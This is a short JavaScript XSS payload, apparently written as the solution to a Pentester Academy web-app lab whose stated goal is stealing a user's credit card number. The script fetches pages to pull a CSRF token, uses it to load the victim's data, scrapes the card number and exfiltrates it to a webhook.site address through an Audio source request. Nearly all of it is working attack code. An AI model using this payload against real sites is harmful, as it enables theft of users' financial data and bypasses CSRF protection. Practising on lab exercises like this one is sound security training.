// req1s://pentesteracademylab.appspot.com/lab/webapp/jfp/19

// Objectives:
//     Find John's Credit Card Number using an XSS vulnerability on this page
//     Display the Credit Card Number in the div with id "result"
//     Post the Credit Card Number to a simulated Attacker Server
//     No Hardcoded values can be used - everything has to be figured out dynamically


let settings = document.getElementById('settings');
let uid = settings.textContent.split(':')[1]
let url = settings.href

let req1 = new XMLHttpRequest();
req1.open('GET', url, true);
req1.responseType = 'document';
req1.send()

let req2 = new XMLHttpRequest();

req1.onreadystatechange = function (){
    if (this.readyState == 4 && this.status == 200){
        let page = req1.responseXML;
        let token = page.forms[0].elements[1].value;
        
        let url = page.forms[0].action + '?uid=' + uid + '&csrf_token=' + token;
        
        req2.open('GET', url, true);
        req2.responseType = 'document';
        req2.send();
    }
}

req2.onreadystatechange = function (){
    if (this.readyState == 4 && this.status == 200){
        let page = req2.responseXML;
        let ccn = page.getElementById('result').textContent;
        document.getElementById('result').innerHTML = ccn;
        let audio = new Audio().src='https://webhook.site/9dc7264d-4455-46aa-83e8-2083096f8b57?ccn=' + ccn;
    }
}